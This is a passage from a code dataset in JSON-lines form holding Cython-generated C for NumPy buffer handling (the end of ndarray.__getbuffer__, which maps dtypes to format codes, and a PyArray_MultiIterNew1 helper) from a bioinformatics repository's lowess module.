\"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":218\n *                 # as one block, strides first.\n *                 info.strides = <Py_ssize_t*>stdlib.malloc(sizeof(Py_ssize_t) * ndim * 2)\n *                 info.shape = info.strides + ndim             # <<<<<<<<<<<<<<\n *                 for i in range(ndim):\n *                     info.strides[i] = PyArray_STRIDES(self)[i]\n */\n    __pyx_v_info->shape = (__pyx_v_info->strides + __pyx_v_ndim);\n\n    /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":219\n *                 info.strides = <Py_ssize_t*>stdlib.malloc(sizeof(Py_ssize_t) * ndim * 2)\n *                 info.shape = info.strides + ndim\n *                 for i in range(ndim):             # <<<<<<<<<<<<<<\n *                     info.strides[i] = PyArray_STRIDES(self)[i]\n *                     info.shape[i] = PyArray_DIMS(self)[i]\n */\n    __pyx_t_5 = __pyx_v_ndim;\n    for (__pyx_t_6 = 0; __pyx_t_6 < __pyx_t_5; __pyx_t_6+=1) {\n      __pyx_v_i = __pyx_t_6;\n\n      /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":220\n *                 info.shape = info.strides + ndim\n *                 for i in range(ndim):\n *                     info.strides[i] = PyArray_STRIDES(self)[i]             # <<<<<<<<<<<<<<\n *                     info.shape[i] = PyArray_DIMS(self)[i]\n *             else:\n */\n      (__pyx_v_info->strides[__pyx_v_i]) = (PyArray_STRIDES(((PyArrayObject *)__pyx_v_self))[__pyx_v_i]);\n\n      /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":221\n *                 for i in range(ndim):\n *                     info.strides[i] = PyArray_STRIDES(self)[i]\n *                     info.shape[i] = PyArray_DIMS(self)[i]             # <<<<<<<<<<<<<<\n *             else:\n *                 info.strides = <Py_ssize_t*>PyArray_STRIDES(self)\n */\n      (__pyx_v_info->shape[__pyx_v_i]) = (PyArray_DIMS(((PyArrayObject *)__pyx_v_self))[__pyx_v_i]);\n    }\n    goto __pyx_L8;\n  }\n  /*else*/ {\n\n    /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":223\n *                     info.shape[i] = PyArray_DIMS(self)[i]\n *             else:\n *                 info.strides = <Py_ssize_t*>PyArray_STRIDES(self)             # <<<<<<<<<<<<<<\n *                 info.shape = <Py_ssize_t*>PyArray_DIMS(self)\n *             info.suboffsets = NULL\n */\n    __pyx_v_info->strides = ((Py_ssize_t *)PyArray_STRIDES(((PyArrayObject *)__pyx_v_self)));\n\n    /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":224\n *             else:\n *                 info.strides = <Py_ssize_t*>PyArray_STRIDES(self)\n *                 info.shape = <Py_ssize_t*>PyArray_DIMS(self)             # <<<<<<<<<<<<<<\n *             info.suboffsets = NULL\n *             info.itemsize = PyArray_ITEMSIZE(self)\n */\n    __pyx_v_info->shape = ((Py_ssize_t *)PyArray_DIMS(((PyArrayObject *)__pyx_v_self)));\n  }\n  __pyx_L8:;\n\n  /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":225\n *                 info.strides = <Py_ssize_t*>PyArray_STRIDES(self)\n *                 info.shape = <Py_ssize_t*>PyArray_DIMS(self)\n *             info.suboffsets = NULL             # <<<<<<<<<<<<<<\n *             info.itemsize = PyArray_ITEMSIZE(self)\n *             info.readonly = not PyArray_ISWRITEABLE(self)\n */\n  __pyx_v_info->suboffsets = NULL;\n\n  /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":226\n *                 info.shape = <Py_ssize_t*>PyArray_DIMS(self)\n *             info.suboffsets = NULL\n *             info.itemsize = PyArray_ITEMSIZE(self)             # <<<<<<<<<<<<<<\n *             info.readonly = not PyArray_ISWRITEABLE(self)\n * \n */\n  __pyx_v_info->itemsize = PyArray_ITEMSIZE(((PyArrayObject *)__pyx_v_self));\n\n  /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":227\n *             info.suboffsets = NULL\n *             info.itemsize = PyArray_ITEMSIZE(self)\n *             info.readonly = not PyArray_ISWRITEABLE(self)             # <<<<<<<<<<<<<<\n * \n *             cdef int t\n */\n  __pyx_v_info->readonly = (!PyArray_ISWRITEABLE(((PyArrayObject *)__pyx_v_self)));\n\n  /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":230\n * \n *             cdef int t\n *             cdef char* f = NULL             # <<<<<<<<<<<<<<\n *             cdef dtype descr = self.descr\n *             cdef list stack\n */\n  __pyx_v_f = NULL;\n\n  /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":231\n *             cdef int t\n *             cdef char* f = NULL\n *             cdef dtype descr = self.descr             # <<<<<<<<<<<<<<\n *             cdef list stack\n *             cdef int offset\n */\n  __Pyx_INCREF(((PyObject *)((PyArrayObject *)__pyx_v_self)->descr));\n  __pyx_v_descr = ((PyArrayObject *)__pyx_v_self)->descr;\n\n  /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":235\n *             cdef int offset\n * \n *             cdef bint hasfields = PyDataType_HASFIELDS(descr)             # <<<<<<<<<<<<<<\n * \n *             if not hasfields and not copy_shape:\n */\n  __pyx_v_hasfields = PyDataType_HASFIELDS(__pyx_v_descr);\n\n  /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":237\n *             cdef bint hasfields = PyDataType_HASFIELDS(descr)\n * \n *             if not hasfields and not copy_shape:             # <<<<<<<<<<<<<<\n *                 # do not call releasebuffer\n *                 info.obj = None\n */\n  __pyx_t_2 = (!__pyx_v_hasfields);\n  if (__pyx_t_2) {\n    __pyx_t_3 = (!__pyx_v_copy_shape);\n    __pyx_t_1 = __pyx_t_3;\n  } else {\n    __pyx_t_1 = __pyx_t_2;\n  }\n  if (__pyx_t_1) {\n\n    /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":239\n *             if not hasfields and not copy_shape:\n *                 # do not call releasebuffer\n *                 info.obj = None             # <<<<<<<<<<<<<<\n *             else:\n *                 # need to call releasebuffer\n */\n    __Pyx_INCREF(Py_None);\n    __Pyx_GIVEREF(Py_None);\n    __Pyx_GOTREF(__pyx_v_info->obj);\n    __Pyx_DECREF(__pyx_v_info->obj);\n    __pyx_v_info->obj = Py_None;\n    goto __pyx_L11;\n  }\n  /*else*/ {\n\n    /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":242\n *             else:\n *                 # need to call releasebuffer\n *                 info.obj = self             # <<<<<<<<<<<<<<\n * \n *             if not hasfields:\n */\n    __Pyx_INCREF(__pyx_v_self);\n    __Pyx_GIVEREF(__pyx_v_self);\n    __Pyx_GOTREF(__pyx_v_info->obj);\n    __Pyx_DECREF(__pyx_v_info->obj);\n    __pyx_v_info->obj = __pyx_v_self;\n  }\n  __pyx_L11:;\n\n  /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":244\n *                 info.obj = self\n * \n *             if not hasfields:             # <<<<<<<<<<<<<<\n *                 t = descr.type_num\n *                 if ((descr.byteorder == '>' and little_endian) or\n */\n  __pyx_t_1 = (!__pyx_v_hasfields);\n  if (__pyx_t_1) {\n\n    /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":245\n * \n *             if not hasfields:\n *                 t = descr.type_num             # <<<<<<<<<<<<<<\n *                 if ((descr.byteorder == '>' and little_endian) or\n *                     (descr.byteorder == '<' and not little_endian)):\n */\n    __pyx_v_t = __pyx_v_descr->type_num;\n\n    /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":246\n *             if not hasfields:\n *                 t = descr.type_num\n *                 if ((descr.byteorder == '>' and little_endian) or             # <<<<<<<<<<<<<<\n *                     (descr.byteorder == '<' and not little_endian)):\n *                     raise ValueError(u\"Non-native byte order not supported\")\n */\n    __pyx_t_1 = (__pyx_v_descr->byteorder == '>');\n    if (__pyx_t_1) {\n      __pyx_t_2 = __pyx_v_little_endian;\n    } else {\n      __pyx_t_2 = __pyx_t_1;\n    }\n    if (!__pyx_t_2) {\n\n      /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":247\n *                 t = descr.type_num\n *                 if ((descr.byteorder == '>' and little_endian) or\n *                     (descr.byteorder == '<' and not little_endian)):             # <<<<<<<<<<<<<<\n *                     raise ValueError(u\"Non-native byte order not supported\")\n *                 if   t == NPY_BYTE:        f = \"b\"\n */\n      __pyx_t_1 = (__pyx_v_descr->byteorder == '<');\n      if (__pyx_t_1) {\n        __pyx_t_3 = (!__pyx_v_little_endian);\n        __pyx_t_7 = __pyx_t_3;\n      } else {\n        __pyx_t_7 = __pyx_t_1;\n      }\n      __pyx_t_1 = __pyx_t_7;\n    } else {\n      __pyx_t_1 = __pyx_t_2;\n    }\n    if (__pyx_t_1) {\n\n      /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":248\n *                 if ((descr.byteorder == '>' and little_endian) or\n *                     (descr.byteorder == '<' and not little_endian)):\n *                     raise ValueError(u\"Non-native byte order not supported\")             # <<<<<<<<<<<<<<\n *                 if   t == NPY_BYTE:        f = \"b\"\n *                 elif t == NPY_UBYTE:       f = \"B\"\n */\n      __pyx_t_4 = PyObject_Call(__pyx_builtin_ValueError, ((PyObject *)__pyx_k_tuple_13), NULL); if (unlikely(!__pyx_t_4)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 248; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_GOTREF(__pyx_t_4);\n      __Pyx_Raise(__pyx_t_4, 0, 0);\n      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n      {__pyx_filename = __pyx_f[1]; __pyx_lineno = 248; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      goto __pyx_L13;\n    }\n    __pyx_L13:;\n\n    /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":249\n *                     (descr.byteorder == '<' and not little_endian)):\n *                     raise ValueError(u\"Non-native byte order not supported\")\n *                 if   t == NPY_BYTE:        f = \"b\"             # <<<<<<<<<<<<<<\n *                 elif t == NPY_UBYTE:       f = \"B\"\n *                 elif t == NPY_SHORT:       f = \"h\"\n */\n    __pyx_t_1 = (__pyx_v_t == NPY_BYTE);\n    if (__pyx_t_1) {\n      __pyx_v_f = __pyx_k__b;\n      goto __pyx_L14;\n    }\n\n    /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":250\n *                     raise ValueError(u\"Non-native byte order not supported\")\n *                 if   t == NPY_BYTE:        f = \"b\"\n *                 elif t == NPY_UBYTE:       f = \"B\"             # <<<<<<<<<<<<<<\n *                 elif t == NPY_SHORT:       f = \"h\"\n *                 elif t == NPY_USHORT:      f = \"H\"\n */\n    __pyx_t_1 = (__pyx_v_t == NPY_UBYTE);\n    if (__pyx_t_1) {\n      __pyx_v_f = __pyx_k__B;\n      goto __pyx_L14;\n    }\n\n    /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":251\n *                 if   t == NPY_BYTE:        f = \"b\"\n *                 elif t == NPY_UBYTE:       f = \"B\"\n *                 elif t == NPY_SHORT:       f = \"h\"             # <<<<<<<<<<<<<<\n *                 elif t == NPY_USHORT:      f = \"H\"\n *                 elif t == NPY_INT:         f = \"i\"\n */\n    __pyx_t_1 = (__pyx_v_t == NPY_SHORT);\n    if (__pyx_t_1) {\n      __pyx_v_f = __pyx_k__h;\n      goto __pyx_L14;\n    }\n\n    /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":252\n *                 elif t == NPY_UBYTE:       f = \"B\"\n *                 elif t == NPY_SHORT:       f = \"h\"\n *                 elif t == NPY_USHORT:      f = \"H\"             # <<<<<<<<<<<<<<\n *                 elif t == NPY_INT:         f = \"i\"\n *                 elif t == NPY_UINT:        f = \"I\"\n */\n    __pyx_t_1 = (__pyx_v_t == NPY_USHORT);\n    if (__pyx_t_1) {\n      __pyx_v_f = __pyx_k__H;\n      goto __pyx_L14;\n    }\n\n    /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":253\n *                 elif t == NPY_SHORT:       f = \"h\"\n *                 elif t == NPY_USHORT:      f = \"H\"\n *                 elif t == NPY_INT:         f = \"i\"             # <<<<<<<<<<<<<<\n *                 elif t == NPY_UINT:        f = \"I\"\n *                 elif t == NPY_LONG:        f = \"l\"\n */\n    __pyx_t_1 = (__pyx_v_t == NPY_INT);\n    if (__pyx_t_1) {\n      __pyx_v_f = __pyx_k__i;\n      goto __pyx_L14;\n    }\n\n    /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":254\n *                 elif t == NPY_USHORT:      f = \"H\"\n *                 elif t == NPY_INT:         f = \"i\"\n *                 elif t == NPY_UINT:        f = \"I\"             # <<<<<<<<<<<<<<\n *                 elif t == NPY_LONG:        f = \"l\"\n *                 elif t == NPY_ULONG:       f = \"L\"\n */\n    __pyx_t_1 = (__pyx_v_t == NPY_UINT);\n    if (__pyx_t_1) {\n      __pyx_v_f = __pyx_k__I;\n      goto __pyx_L14;\n    }\n\n    /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":255\n *                 elif t == NPY_INT:         f = \"i\"\n *                 elif t == NPY_UINT:        f = \"I\"\n *                 elif t == NPY_LONG:        f = \"l\"             # <<<<<<<<<<<<<<\n *                 elif t == NPY_ULONG:       f = \"L\"\n *                 elif t == NPY_LONGLONG:    f = \"q\"\n */\n    __pyx_t_1 = (__pyx_v_t == NPY_LONG);\n    if (__pyx_t_1) {\n      __pyx_v_f = __pyx_k__l;\n      goto __pyx_L14;\n    }\n\n    /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":256\n *                 elif t == NPY_UINT:        f = \"I\"\n *                 elif t == NPY_LONG:        f = \"l\"\n *                 elif t == NPY_ULONG:       f = \"L\"             # <<<<<<<<<<<<<<\n *                 elif t == NPY_LONGLONG:    f = \"q\"\n *                 elif t == NPY_ULONGLONG:   f = \"Q\"\n */\n    __pyx_t_1 = (__pyx_v_t == NPY_ULONG);\n    if (__pyx_t_1) {\n      __pyx_v_f = __pyx_k__L;\n      goto __pyx_L14;\n    }\n\n    /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":257\n *                 elif t == NPY_LONG:        f = \"l\"\n *                 elif t == NPY_ULONG:       f = \"L\"\n *                 elif t == NPY_LONGLONG:    f = \"q\"             # <<<<<<<<<<<<<<\n *                 elif t == NPY_ULONGLONG:   f = \"Q\"\n *                 elif t == NPY_FLOAT:       f = \"f\"\n */\n    __pyx_t_1 = (__pyx_v_t == NPY_LONGLONG);\n    if (__pyx_t_1) {\n      __pyx_v_f = __pyx_k__q;\n      goto __pyx_L14;\n    }\n\n    /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":258\n *                 elif t == NPY_ULONG:       f = \"L\"\n *                 elif t == NPY_LONGLONG:    f = \"q\"\n *                 elif t == NPY_ULONGLONG:   f = \"Q\"             # <<<<<<<<<<<<<<\n *                 elif t == NPY_FLOAT:       f = \"f\"\n *                 elif t == NPY_DOUBLE:      f = \"d\"\n */\n    __pyx_t_1 = (__pyx_v_t == NPY_ULONGLONG);\n    if (__pyx_t_1) {\n      __pyx_v_f = __pyx_k__Q;\n      goto __pyx_L14;\n    }\n\n    /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":259\n *                 elif t == NPY_LONGLONG:    f = \"q\"\n *                 elif t == NPY_ULONGLONG:   f = \"Q\"\n *                 elif t == NPY_FLOAT:       f = \"f\"             # <<<<<<<<<<<<<<\n *                 elif t == NPY_DOUBLE:      f = \"d\"\n *                 elif t == NPY_LONGDOUBLE:  f = \"g\"\n */\n    __pyx_t_1 = (__pyx_v_t == NPY_FLOAT);\n    if (__pyx_t_1) {\n      __pyx_v_f = __pyx_k__f;\n      goto __pyx_L14;\n    }\n\n    /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":260\n *                 elif t == NPY_ULONGLONG:   f = \"Q\"\n *                 elif t == NPY_FLOAT:       f = \"f\"\n *                 elif t == NPY_DOUBLE:      f = \"d\"             # <<<<<<<<<<<<<<\n *                 elif t == NPY_LONGDOUBLE:  f = \"g\"\n *                 elif t == NPY_CFLOAT:      f = \"Zf\"\n */\n    __pyx_t_1 = (__pyx_v_t == NPY_DOUBLE);\n    if (__pyx_t_1) {\n      __pyx_v_f = __pyx_k__d;\n      goto __pyx_L14;\n    }\n\n    /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":261\n *                 elif t == NPY_FLOAT:       f = \"f\"\n *                 elif t == NPY_DOUBLE:      f = \"d\"\n *                 elif t == NPY_LONGDOUBLE:  f = \"g\"             # <<<<<<<<<<<<<<\n *                 elif t == NPY_CFLOAT:      f = \"Zf\"\n *                 elif t == NPY_CDOUBLE:     f = \"Zd\"\n */\n    __pyx_t_1 = (__pyx_v_t == NPY_LONGDOUBLE);\n    if (__pyx_t_1) {\n      __pyx_v_f = __pyx_k__g;\n      goto __pyx_L14;\n    }\n\n    /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":262\n *                 elif t == NPY_DOUBLE:      f = \"d\"\n *                 elif t == NPY_LONGDOUBLE:  f = \"g\"\n *                 elif t == NPY_CFLOAT:      f = \"Zf\"             # <<<<<<<<<<<<<<\n *                 elif t == NPY_CDOUBLE:     f = \"Zd\"\n *                 elif t == NPY_CLONGDOUBLE: f = \"Zg\"\n */\n    __pyx_t_1 = (__pyx_v_t == NPY_CFLOAT);\n    if (__pyx_t_1) {\n      __pyx_v_f = __pyx_k__Zf;\n      goto __pyx_L14;\n    }\n\n    /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":263\n *                 elif t == NPY_LONGDOUBLE:  f = \"g\"\n *                 elif t == NPY_CFLOAT:      f = \"Zf\"\n *                 elif t == NPY_CDOUBLE:     f = \"Zd\"             # <<<<<<<<<<<<<<\n *                 elif t == NPY_CLONGDOUBLE: f = \"Zg\"\n *                 elif t == NPY_OBJECT:      f = \"O\"\n */\n    __pyx_t_1 = (__pyx_v_t == NPY_CDOUBLE);\n    if (__pyx_t_1) {\n      __pyx_v_f = __pyx_k__Zd;\n      goto __pyx_L14;\n    }\n\n    /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":264\n *                 elif t == NPY_CFLOAT:      f = \"Zf\"\n *                 elif t == NPY_CDOUBLE:     f = \"Zd\"\n *                 elif t == NPY_CLONGDOUBLE: f = \"Zg\"             # <<<<<<<<<<<<<<\n *                 elif t == NPY_OBJECT:      f = \"O\"\n *                 else:\n */\n    __pyx_t_1 = (__pyx_v_t == NPY_CLONGDOUBLE);\n    if (__pyx_t_1) {\n      __pyx_v_f = __pyx_k__Zg;\n      goto __pyx_L14;\n    }\n\n    /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":265\n *                 elif t == NPY_CDOUBLE:     f = \"Zd\"\n *                 elif t == NPY_CLONGDOUBLE: f = \"Zg\"\n *                 elif t == NPY_OBJECT:      f = \"O\"             # <<<<<<<<<<<<<<\n *                 else:\n *                     raise ValueError(u\"unknown dtype code in numpy.pxd (%d)\" % t)\n */\n    __pyx_t_1 = (__pyx_v_t == NPY_OBJECT);\n    if (__pyx_t_1) {\n      __pyx_v_f = __pyx_k__O;\n      goto __pyx_L14;\n    }\n    /*else*/ {\n\n      /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":267\n *                 elif t == NPY_OBJECT:      f = \"O\"\n *                 else:\n *                     raise ValueError(u\"unknown dtype code in numpy.pxd (%d)\" % t)             # <<<<<<<<<<<<<<\n *                 info.format = f\n *                 return\n */\n      __pyx_t_4 = PyInt_FromLong(__pyx_v_t); if (unlikely(!__pyx_t_4)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 267; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_GOTREF(__pyx_t_4);\n      __pyx_t_8 = PyNumber_Remainder(((PyObject *)__pyx_kp_u_14), __pyx_t_4); if (unlikely(!__pyx_t_8)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 267; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_GOTREF(((PyObject *)__pyx_t_8));\n      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n      __pyx_t_4 = PyTuple_New(1); if (unlikely(!__pyx_t_4)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 267; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_GOTREF(((PyObject *)__pyx_t_4));\n      PyTuple_SET_ITEM(__pyx_t_4, 0, ((PyObject *)__pyx_t_8));\n      __Pyx_GIVEREF(((PyObject *)__pyx_t_8));\n      __pyx_t_8 = 0;\n      __pyx_t_8 = PyObject_Call(__pyx_builtin_ValueError, ((PyObject *)__pyx_t_4), NULL); if (unlikely(!__pyx_t_8)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 267; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n      __Pyx_GOTREF(__pyx_t_8);\n      __Pyx_DECREF(((PyObject *)__pyx_t_4)); __pyx_t_4 = 0;\n      __Pyx_Raise(__pyx_t_8, 0, 0);\n      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;\n      {__pyx_filename = __pyx_f[1]; __pyx_lineno = 267; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n    }\n    __pyx_L14:;\n\n    /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":268\n *                 else:\n *                     raise ValueError(u\"unknown dtype code in numpy.pxd (%d)\" % t)\n *                 info.format = f             # <<<<<<<<<<<<<<\n *                 return\n *             else:\n */\n    __pyx_v_info->format = __pyx_v_f;\n\n    /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":269\n *                     raise ValueError(u\"unknown dtype code in numpy.pxd (%d)\" % t)\n *                 info.format = f\n *                 return             # <<<<<<<<<<<<<<\n *             else:\n *                 info.format = <char*>stdlib.malloc(_buffer_format_string_len)\n */\n    __pyx_r = 0;\n    goto __pyx_L0;\n    goto __pyx_L12;\n  }\n  /*else*/ {\n\n    /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":271\n *                 return\n *             else:\n *                 info.format = <char*>stdlib.malloc(_buffer_format_string_len)             # <<<<<<<<<<<<<<\n *                 info.format[0] = '^' # Native data types, manual alignment\n *                 offset = 0\n */\n    __pyx_v_info->format = ((char *)malloc(255));\n\n    /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":272\n *             else:\n *                 info.format = <char*>stdlib.malloc(_buffer_format_string_len)\n *                 info.format[0] = '^' # Native data types, manual alignment             # <<<<<<<<<<<<<<\n *                 offset = 0\n *                 f = _util_dtypestring(descr, info.format + 1,\n */\n    (__pyx_v_info->format[0]) = '^';\n\n    /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":273\n *                 info.format = <char*>stdlib.malloc(_buffer_format_string_len)\n *                 info.format[0] = '^' # Native data types, manual alignment\n *                 offset = 0             # <<<<<<<<<<<<<<\n *                 f = _util_dtypestring(descr, info.format + 1,\n *                                       info.format + _buffer_format_string_len,\n */\n    __pyx_v_offset = 0;\n\n    /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":276\n *                 f = _util_dtypestring(descr, info.format + 1,\n *                                       info.format + _buffer_format_string_len,\n *                                       &offset)             # <<<<<<<<<<<<<<\n *                 f[0] = 0 # Terminate format string\n * \n */\n    __pyx_t_9 = __pyx_f_5numpy__util_dtypestring(__pyx_v_descr, (__pyx_v_info->format + 1), (__pyx_v_info->format + 255), (&__pyx_v_offset)); if (unlikely(__pyx_t_9 == NULL)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 274; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n    __pyx_v_f = __pyx_t_9;\n\n    /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":277\n *                                       info.format + _buffer_format_string_len,\n *                                       &offset)\n *                 f[0] = 0 # Terminate format string             # <<<<<<<<<<<<<<\n * \n *         def __releasebuffer__(ndarray self, Py_buffer* info):\n */\n    (__pyx_v_f[0]) = 0;\n  }\n  __pyx_L12:;\n\n  __pyx_r = 0;\n  goto __pyx_L0;\n  __pyx_L1_error:;\n  __Pyx_XDECREF(__pyx_t_4);\n  __Pyx_XDECREF(__pyx_t_8);\n  __Pyx_AddTraceback(\"numpy.ndarray.__getbuffer__\");\n  __pyx_r = -1;\n  __Pyx_GOTREF(__pyx_v_info->obj);\n  __Pyx_DECREF(__pyx_v_info->obj); __pyx_v_info->obj = NULL;\n  goto __pyx_L2;\n  __pyx_L0:;\n  if (__pyx_v_info->obj == Py_None) {\n    __Pyx_GOTREF(Py_None);\n    __Pyx_DECREF(Py_None); __pyx_v_info->obj = NULL;\n  }\n  __pyx_L2:;\n  __Pyx_XDECREF((PyObject *)__pyx_v_descr);\n  __Pyx_RefNannyFinishContext();\n  return __pyx_r;\n}", "path": "lowess\\lowess.c", "repo_name": "brentp/bio-playground", "stars": 178, "license": "mit", "language": "c", "size": 1002}
{"docstring": "/* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":756\n * ctypedef npy_cdouble     complex_t\n * \n * cdef inline object PyArray_MultiIterNew1(a):             # <<<<<<<<<<<<<<\n *     return PyArray_MultiIterNew(1, <void*>a)\n * \n */\n", "func_signal": "static CYTHON_INLINE PyObject *__pyx_f_5numpy_PyArray_MultiIterNew1(PyObject *__pyx_v_a)", "code": "{\n  PyObject *__pyx_r = NULL;\n  PyObject *__pyx_t_1 = NULL;\n  __Pyx_RefNannySetupContext(\"PyArray_MultiIterNew1\");\n\n  /* \"/usr/local/lib/python2.6/dist-packages/Cython-0.14-py2.6-linux-i686.egg/Cython/Includes/numpy.pxd\":757\n * \n * cdef inline object PyArray_MultiIterNew1(a):\n *     return PyArray_MultiIterNew(1, <void*>a)             # <<<<<<<<<<<<<<\n * \n * cdef inline object PyArray_MultiIterNew2(a, b):\n */\n  __Pyx_XDECREF(__pyx_r);\n  __pyx_t_1 = PyArray_MultiIterNew(1, ((void *)__pyx_v_a)); if (unlikely(!__pyx_t_1)) {__pyx_filename = __pyx_f[1]; __pyx_lineno = 757; __pyx_clineno = __LINE__; goto __pyx_L1_error;}\n  __Pyx_GOTREF(__pyx_t_1);\n  __pyx_r = __pyx_t_1;\n  __pyx_t_1 = 0;\n  goto __pyx_L0;\n\n  __pyx_r = Py_None; __Pyx_INCREF(Py_None);\n  goto __pyx_L0;\n  __pyx_L1_error:;\n  __Pyx_XDECREF(__pyx_t_1);\n  __Pyx_AddTraceback(\"numpy.PyArray_MultiIterNew1\");\n  __pyx_r = 0;\n  __pyx_L0:;\n  __Pyx_XGIVEREF(__pyx_r);\n  __Pyx_RefNannyFinishContext();\n  return __pyx_r;\n}", "path": "lowess\\lowess.c", "repo_name": "brentp/bio-playground", "stars": 178, "license": "mit", "language": "c", "size": 1002}
